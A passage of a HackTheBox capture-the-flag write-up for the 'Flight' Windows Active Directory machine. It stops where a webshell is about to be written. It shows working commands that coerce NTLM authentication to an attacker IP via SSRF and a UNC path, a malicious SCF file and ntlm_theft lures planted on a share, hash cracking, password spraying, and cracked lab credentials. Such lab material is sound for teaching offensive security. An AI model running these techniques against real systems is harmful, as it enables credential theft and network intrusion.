---
render_with_liquid: false
title: HackTheBox Writeup  Flight
date: 2023-12-23 03:34:23 +1400
tags: [hackthebox, nmap, windows, ad, autorecon, netexec, gobuster, feroxbuster, subdomain, php, apache, directory-traversal, ssrf, coerce-authentication, unc, responder, hashcat, ldapdomaindump, ad-miner, bloodhound, enum, password-spraying, smartbrute, ntlm_theft, smb, file-write, webshell, reverse-ssh, port-forwarding, runas, runascs, aspx, privilege-token, potato-attacks, juicy-potato-ng, oscp-like-2023, godpotato, coercer, rubeus, ad-delegation, ad-s4u2self, machine-account, impacket, dcsync]
---



Flight is a hard Windows machine that starts with a website with two different virtual hosts. One of them is vulnerable to LFI and allows an attacker to retrieve an NTLM hash. Once cracked, the obtained clear text password will be sprayed across a list of valid usernames to discover a password re-use scenario. Once the attacker has SMB access as the user `s.moon` he is able to write to a share that gets accessed by other users. Certain files can be used to steal the NTLMv2 hash of the users that access the share. Once the second hash is cracked the attacker will be able to write a reverse shell in a share that hosts the web files and gain a shell on the box as low privileged user. Having credentials for the user `c.bum`, it will be possible to gain a shell as this user, which will allow the attacker to write an `aspx` web shell on a web site that&amp;amp;amp;#039;s configured to listen only on localhost. Once the attacker has command execution as the Microsoft Virtual Account he is able to run Rubeus to get a ticket for the machine account that can be used to  perform a DCSync attack ultimately obtaining the hashes for the Administrator user.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ pt init '10.129.228.120 flight.htb g0.flight.htb school.flight.htb'
+---------+--------+----------------+-------------------+
| PROFILE | STATUS |       IP       |      DOMAIN       |
+---------+--------+----------------+-------------------+
| flight  | on     | 10.129.228.120 | flight.htb        |
| flight  | on     | 10.129.228.120 | g0.flight.htb     |
| flight  | on     | 10.129.228.120 | school.flight.htb |
+---------+--------+----------------+-------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sat Dec 23 03:34:22 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49690,49697 10.129.228.120
Nmap scan report for 10.129.228.120
Host is up, received user-set (0.45s latency).
Scanned at 2023-12-23 03:34:23 CST for 110s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods:
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-12-23 02:34:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m24s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 50845/tcp): CLEAN (Timeout)
|   Check 2 (port 4037/tcp): CLEAN (Timeout)
|   Check 3 (port 21917/udp): CLEAN (Timeout)
|   Check 4 (port 18923/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2023-12-23T02:35:52
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Dec 23 03:36:13 2023 -- 1 IP address (1 host up) scanned in 110.95 seconds
```

## Autorecon

```bash
sudo $(which autorecon) -vv flight.htb --global.domain flight.htb
```

## 445 - SMB

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u '' -p ''
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\:

┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'a' -p ''
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [-] flight.htb\a: STATUS_LOGON_FAILURE
```

## 53 - DNS


### DNS Reverse Lookup

```bash
dig -p 53 -x flight.htb @flight.htb
```

```
;; communications error to 10.129.228.120#53: timed out

; <<>> DiG 9.19.17-2~kali1-Kali <<>> -p 53 -x flight.htb @flight.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 59217
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;htb.flight.in-addr.arpa.	IN	PTR

;; Query time: 4234 msec
;; SERVER: 10.129.228.120#53(flight.htb) (UDP)
;; WHEN: Sat Dec 23 04:08:59 CST 2023
;; MSG SIZE  rcvd: 52
```


### DNS Zone Transfer

```bash
dig AXFR -p 53 @flight.htb flight.htb
```

```
; <<>> DiG 9.19.17-2~kali1-Kali <<>> AXFR -p 53 @flight.htb flight.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```


### DnsRecon Default Scan

```bash
dnsrecon -n flight.htb -d flight.htb 2>&1
```

```
[*] std: Performing General Enumeration against: flight.htb...
[-] DNSSEC is not configured for flight.htb
[*] 	 SOA g0.flight.htb 10.129.228.120
[*] 	 SOA g0.flight.htb dead:beef::6430:ae4f:da36:ecf5
[*] 	 NS g0.flight.htb 10.129.228.120
[*] 	 NS g0.flight.htb dead:beef::6430:ae4f:da36:ecf5
[*] 	 A flight.htb 10.129.228.120
[*] 	 AAAA flight.htb dead:beef::6430:ae4f:da36:ecf5
[*] Enumerating SRV Records
[+] 	 SRV _ldap._tcp.flight.htb g0.flight.htb 10.129.228.120 389
[+] 	 SRV _ldap._tcp.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 389
[+] 	 SRV _gc._tcp.flight.htb g0.flight.htb 10.129.228.120 3268
[+] 	 SRV _gc._tcp.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 3268
[+] 	 SRV _kerberos._udp.flight.htb g0.flight.htb 10.129.228.120 88
[+] 	 SRV _kerberos._udp.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 88
[+] 	 SRV _kerberos._tcp.flight.htb g0.flight.htb 10.129.228.120 88
[+] 	 SRV _kerberos._tcp.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 88
[+] 	 SRV _ldap._tcp.ForestDNSZones.flight.htb g0.flight.htb 10.129.228.120 389
[+] 	 SRV _ldap._tcp.ForestDNSZones.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 389
[+] 	 SRV _ldap._tcp.gc._msdcs.flight.htb g0.flight.htb 10.129.228.120 3268
[+] 	 SRV _ldap._tcp.gc._msdcs.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 3268
[+] 	 SRV _ldap._tcp.dc._msdcs.flight.htb g0.flight.htb 10.129.228.120 389
[+] 	 SRV _ldap._tcp.dc._msdcs.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 389
[+] 	 SRV _ldap._tcp.pdc._msdcs.flight.htb g0.flight.htb 10.129.228.120 389
[+] 	 SRV _ldap._tcp.pdc._msdcs.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 389
[+] 	 SRV _kerberos._tcp.dc._msdcs.flight.htb g0.flight.htb 10.129.228.120 88
[+] 	 SRV _kerberos._tcp.dc._msdcs.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 88
[+] 	 SRV _kpasswd._tcp.flight.htb g0.flight.htb 10.129.228.120 464
[+] 	 SRV _kpasswd._tcp.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 464
[+] 	 SRV _kpasswd._udp.flight.htb g0.flight.htb 10.129.228.120 464
[+] 	 SRV _kpasswd._udp.flight.htb g0.flight.htb dead:beef::6430:ae4f:da36:ecf5 464
[+] 22 Records Found
```

### Subdomain Enumeration

```bash
gobuster dns -d flight.htb -r flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o "/home/kali/htb/Flight/results/flight.htb/scans/tcp53/tcp_53_flight.htb_subdomains_subdomains-top1million-110000.txt"
```

```
Found: gc._msdcs.flight.htb
Found: domaindnszones.flight.htb
Found: forestdnszones.flight.htb
```

## 80 - g0 Aviation


### Info

```ruby
http://flight.htb [200] [g0 Aviation] [Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1] [Apache HTTP Server:2.4.52,OpenSSL:1.1.1m,PHP:8.1.1,Windows Server] [9fbc8b3109c25ff68f1d179a2039e2c0e6741810]
```

![](/assets/obsidian/fd3e558ec387eeb305841f02452ddd73.png)

### Directory

```bash
feroxbuster -t 150 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o ferox_80.txt -k -u http://flight.htb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ cat ferox_80.txt | awk '$1!=403 && $1!=503' | grep -vi 'c http://flight.htb/[js|images]'
200      GET       40l       69w      535c http://flight.htb/css/layout.css
200      GET      402l      656w     7269c http://flight.htb/css/style.css
MSG      0.000 feroxbuster::heuristics detected directory listing: http://flight.htb/css/ (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://flight.htb/js/ (Apache)
200      GET       30l      123w      887c http://flight.htb/css/reset.css
MSG      0.000 feroxbuster::heuristics detected directory listing: http://flight.htb/js/ie6_warning (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://flight.htb/Images (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://flight.htb/images/ (Apache)
200      GET      154l      530w     7069c http://flight.htb/
301      GET        9l       30w      330c http://flight.htb/css => http://flight.htb/css/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100 -u http://flight.htb/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://flight.htb/
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: school.flight.htb Status: 200 [Size: 3996]
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

# User Flag
---

## Enumeration


### school.flight.htb

> http://school.flight.htb/index.php?view=blog.html

![](/assets/obsidian/516e5091cf981e8e31dd819180ddeec1.png)

## Auth as svc_apache


### Directory traversal

`/index.php?view=` is likely vulnerable to directory traversal or File Inclusion, lets validate it

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ curl 'http://school.flight.htb/index.php?view=/windows/system32/drivers/etc/hosts'
[...]

# Copyright (c) 1993-2009 Microsoft Corp.

#

# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.

#

# This file contains the mappings of IP addresses to host names. Each

# entry should be kept on an individual line. The IP address should

# be placed in the first column followed by the corresponding host name.

# The IP address and the host name should be separated by at least one

# space.

#

# Additionally, comments (such as these) may be inserted on individual

# lines or following the machine name denoted by a '#' symbol.

#

# For example:

#

#      102.54.94.97     rhino.acme.com          # source server

#       38.25.63.10     x.acme.com              # x client host


# localhost name resolution is handled within DNS itself.

#       127.0.0.1       localhost

#       ::1             localhost
[...]
```

I can check rather it's using `include()` or `file_get_contents()` by including php code and see if it was interpreted

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ mkdir -p www&&cd www

┌──(bravosec㉿fsociety)-[~/htb/Flight/www]
└─$ echo '<?php phpinfo() ?>' > p.php

┌──(bravosec㉿fsociety)-[~/htb/Flight/www]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

The code wasn't interpreted, so this was just directory traversal (No **RFI** either)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ curl 'http://school.flight.htb/index.php?view=http://10.10.16.30/p.php'
[...]
  </div>
<?php phpinfo() ?>
  <div id="footer">
[...]
```

### Coerced authentication via SSRF

**Windows OS** + **SSRF** = **Coerced NTLM auth**

Setup listener to receive NTLM hash

```bash
sudo responder -A -I tun0 -v
```

Use `/` instead

```bash
curl 'http://school.flight.htb/index.php?view=//10.10.16.30/x/x.png'
```

```bash
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:18199122d043fe83:D24C0CDAFC29CD29DE1F22FE060D9F5C:01010000000000008096E417F435DA01BB12384123173F39000000000200080047004D003200510001001E00570049004E002D0031004F00340036003600340046004E00550044004E0004003400570049004E002D0031004F00340036003600340046004E00550044004E002E0047004D00320051002E004C004F00430041004C000300140047004D00320051002E004C004F00430041004C000500140047004D00320051002E004C004F00430041004C00070008008096E417F435DA01060004000200000008003000300000000000000000000000003000005CE573E2C7013E6F3367522C2932A4C0331BD7FD990711471B9252C9D582E0D90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330030000000000000000000
```


### Crack NTLM hash

```bash
hashcat svc_apache_ntlm.hash /opt/wordlists/rockyou.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight/dump]
└─$ hashcat svc_apache_ntlm.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

SVC_APACHE::flight:9e1731a2e1a62054:565e35b81555bec95fe6bfe141023545:01010000000000008096e417f435da015ef4d084d82229b5000000000200080047004d003200510001001e00570049004e002d0031004f00340036003600340046004e00550044004e0004003400570049004e002d0031004f00340036003600340046004e00550044004e002e0047004d00320051002e004c004f00430041004c000300140047004d00320051002e004c004f00430041004c000500140047004d00320051002e004c004f00430041004c00070008008096e417f435da01060004000200000008003000300000000000000000000000003000005ce573e2c7013e6f3367522c2932a4c0331bd7fd990711471b9252c9d582e0d90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330030000000000000000000:S@Ss!K@*t13
```

Validate authentication

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
```

## Auth as S.Moon


### AD Enumeration


#### Tools

```bash
mkdir -p bloodhound-result && cd bloodhound-result && bloodhound-python -d flight.htb -ns 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13' -c all
```

```bash
AD-miner -c -cf flight.htb -u neo4j -p <PASSWORD>
```

```bash
ldapdomaindump -o ldapdomaindump -r flight.htb -u 'flight.htb\svc_apache' -p 'S@Ss!K@*t13'
```

```bash
/opt/sectools/ad/enum4linux-ng/enum4linux-ng.py -oA enum4linux -A flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'
```


#### Findings

- **C.Bum** stands out with the only user having a non-default group

![](/assets/obsidian/0f8e539e2db2b6fbf5d7296babd9aee7.png)

- `WebDevs` is the only group that doesn't have a description

![](/assets/obsidian/07247f2fa2c89e1bf0ffa62a010dc4a7.png)

- There are no users in `remote management users` group

- Only these 4 users : `SVC_APACHE`, `ADMINISTRATOR`, `S.MOON`, `C.BUM` ever logged on 

![](/assets/obsidian/1b2e079f7b7c7db0d3721b88b736da45.png)

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share
SMB         10.129.228.120  445    G0               Shared          READ
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share
SMB         10.129.228.120  445    G0               Users           READ
SMB         10.129.228.120  445    G0               Web             READ
```

`Shared`, `Users`, `Web` are none default shares, checked all of them but nothing interesting found

```bash
folders=(Web Users Shared); for f in $folders; do mkdir -p loot/smb/$f && smbclient "//flight.htb/$f" -U 'svc_apache%S@Ss!K@*t13' -c "lcd loot/smb/$f; mask \"\"; recurse ON; prompt OFF; mget *"; done
```

^797bf4

From `Users` share, I know `C.Bum` logged in to the domain controller before

```bash
┌──(bravosec㉿fsociety)-[~/…/Flight/loot/smb/Users]
└─$ ls
 Administrator  'All Users'   C.Bum   Default  'Default User'   desktop.ini   Public   svc_apache
```


### Password spray

Extract users from bloodhound result

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ cat bloodhound-result/20231223235345_users.json | jq '.data[].Properties.samaccountname | select (.!=null)' -r | tee domain_users.lst
D.Truff
V.Stevens
svc_apache
O.Possum
I.Francis
C.Bum
W.Walker
M.Gold
G.Lors
L.Kein
S.Moon
R.Cold
krbtgt
Administrator
Guest
```

Check null passwords

```bash
/opt/sectools/ad/smartbrute/smartbrute.py brute -bU domain_users.lst -bp '' kerberos -d flight.htb
```

![](/assets/obsidian/9d0372be346dd94d12e889d8efe34426.png)

Check password reuse

```bash
/opt/sectools/ad/smartbrute/smartbrute.py brute -bU domain_users.lst -bp 'S@Ss!K@*t13' kerberos -d flight.htb
```

**S.Moon** have the same password as `svc_apche`, it's reasonable since `Junion Web Developer` was his user description

![](/assets/obsidian/cbe2c71e2cad330a96702d41bca7cccb.png)

Validate authentication

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13'
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
```

## Auth as C.Bum


### Shares

I can write files to `Shared`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share
SMB         10.129.228.120  445    G0               Shared          READ,WRITE
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share
SMB         10.129.228.120  445    G0               Users           READ
SMB         10.129.228.120  445    G0               Web             READ
```

### Testing for disabled file extensions

I tried SCF and shortcut icons attack to coerce auth to my machine, but failed to write files

> `cache.scf`

```bash
[Shell]
Command=2
IconFile=\\10.10.16.30\s\s.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ smbclient '//flight.htb/Shared' -U 'S.Moon%S@Ss!K@*t13'                                             
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Dec 24 09:13:39 2023
  ..                                  D        0  Sun Dec 24 09:13:39 2023

                5056511 blocks of size 4096. 1160782 blocks available
smb: \> put cache.scf
NT_STATUS_ACCESS_DENIED opening remote file \cache.scf
```

```bash
nxc smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' -M slinky -o SERVER=10.10.16.30 NAME="cache" CLEANUP=false
nxc smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' -M scuffy -o SERVER=10.10.16.30 NAME="cache" CLEANUP=false
```

Error :

```bash
SCUFFY      10.129.228.120  445    G0               [+] Found writable share: Shared
SCUFFY      10.129.228.120  445    G0               [-] Error deleting SCF file on share Shared: SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
```

I tried to upload a file with no file extension, and it was successfully uploaded, the share is filtering files with some extensions

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ touch test
```

```bash
smb: \> put test
putting file test as \test (0.0 kb/s) (average 0.0 kb/s)
```


### Steal NTLM hashes with ntlm_theft

Search `scf` in [the hacker recipes](https://www.thehacker.recipes/) to find related resource

> https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land#shortcut-files-scf-lnk-url

[ntlm_theft](https://github.com/Greenwolf/ntlm_theft) can abuse with multiple file types

![](/assets/obsidian/c867fbefb4e0c4d638721a351f83352c.png)

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/ntlm_theft]
└─$ python ntlm_theft.py --generate all --server 10.10.16.30 --filename cache
Created: cache/cache.scf (BROWSE TO FOLDER)
Created: cache/cache-(url).url (BROWSE TO FOLDER)
Created: cache/cache-(icon).url (BROWSE TO FOLDER)
Created: cache/cache.lnk (BROWSE TO FOLDER)
Created: cache/cache.rtf (OPEN)
Created: cache/cache-(stylesheet).xml (OPEN)
Created: cache/cache-(fulldocx).xml (OPEN)
Created: cache/cache.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: cache/cache-(includepicture).docx (OPEN)
Created: cache/cache-(remotetemplate).docx (OPEN)
Created: cache/cache-(frameset).docx (OPEN)
Created: cache/cache-(externalcell).xlsx (OPEN)
Created: cache/cache.wax (OPEN)
Created: cache/cache.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: cache/cache.asx (OPEN)
Created: cache/cache.jnlp (OPEN)
Created: cache/cache.application (DOWNLOAD AND OPEN)
Created: cache/cache.pdf (OPEN AND ALLOW)
Created: cache/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: cache/Autorun.inf (BROWSE TO FOLDER)
Created: cache/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

Upload the generated files

```bash
smbclient '//flight.htb/Shared' -U 'S.Moon%S@Ss!K@*t13' -c 'prompt OFF; recurse ON; lcd /opt/sectools/ad/ntlm_theft/cache; mput *'
```

```bash
putting file desktop.ini as \desktop.ini (0.0 kb/s) (average 0.0 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \cache.rtf
NT_STATUS_ACCESS_DENIED opening remote file \cache-(url).url
NT_STATUS_ACCESS_DENIED opening remote file \cache-(frameset).docx
NT_STATUS_ACCESS_DENIED opening remote file \cache.wax
NT_STATUS_ACCESS_DENIED opening remote file \cache-(externalcell).xlsx
NT_STATUS_ACCESS_DENIED opening remote file \cache.asx
NT_STATUS_ACCESS_DENIED opening remote file \cache.htm
NT_STATUS_ACCESS_DENIED opening remote file \Autorun.inf
putting file cache.jnlp as \cache.jnlp (0.2 kb/s) (average 0.1 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \cache.m3u
NT_STATUS_ACCESS_DENIED opening remote file \cache.scf
NT_STATUS_ACCESS_DENIED opening remote file \cache-(remotetemplate).docx
putting file cache.application as \cache.application (1.0 kb/s) (average 0.5 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \zoom-attack-instructions.txt
putting file cache-(stylesheet).xml as \cache-(stylesheet).xml (0.1 kb/s) (average 0.4 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \cache-(includepicture).docx
NT_STATUS_ACCESS_DENIED opening remote file \cache.pdf
NT_STATUS_ACCESS_DENIED opening remote file \cache-(icon).url
putting file cache-(fulldocx).xml as \cache-(fulldocx).xml (19.8 kb/s) (average 7.9 kb/s)
NT_STATUS_ACCESS_DENIED opening remote file \cache.lnk
```

After waiting for 10 seconds, I received the hash from `c.bum`

```bash
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:cff807fb60d50b18:A606C555E794956E2C038DE32DFD2DF1:01010000000000000048EE674A36DA015D16750EF6C6377E0000000002000800420053004D00320001001E00570049004E002D0042004300580039004F00550051004100310055004D0004003400570049004E002D0042004300580039004F00550051004100310055004D002E00420053004D0032002E004C004F00430041004C0003001400420053004D0032002E004C004F00430041004C0005001400420053004D0032002E004C004F00430041004C00070008000048EE674A36DA01060004000200000008003000300000000000000000000000003000005CE573E2C7013E6F3367522C2932A4C0331BD7FD990711471B9252C9D582E0D90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330030000000000000000000
```


### Crack NTLM hash

```bash
hashcat c.bum_ntlm.hash /opt/wordlists/rockyou.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight/dump]
└─$ hashcat c.bum_ntlm.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

C.BUM::flight.htb:cff807fb60d50b18:a606c555e794956e2c038de32dfd2df1:01010000000000000048ee674a36da015d16750ef6c6377e0000000002000800420053004d00320001001e00570049004e002d0042004300580039004f00550051004100310055004d0004003400570049004e002d0042004300580039004f00550051004100310055004d002e00420053004d0032002e004c004f00430041004c0003001400420053004d0032002e004c004f00430041004c0005001400420053004d0032002e004c004f00430041004c00070008000048ee674a36da01060004000200000008003000300000000000000000000000003000005ce573e2c7013e6f3367522c2932a4c0331bd7fd990711471b9252c9d582e0d90a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330030000000000000000000:Tikkycoll_431012284
```

Validate auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'C.BUM' -p 'Tikkycoll_431012284'
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\C.BUM:Tikkycoll_431012284
```

## Shell as svc_apache

### PHP Webshell

Now I can finally write to `Web` share

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'C.BUM' -p 'Tikkycoll_431012284' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\C.BUM:Tikkycoll_431012284
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share
SMB         10.129.228.120  445    G0               Shared          READ,WRITE
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share
SMB         10.129.228.120  445    G0               Users           READ
SMB         10.129.228.120  445    G0               Web             READ,WRITE
```

Write a webshell

```bash
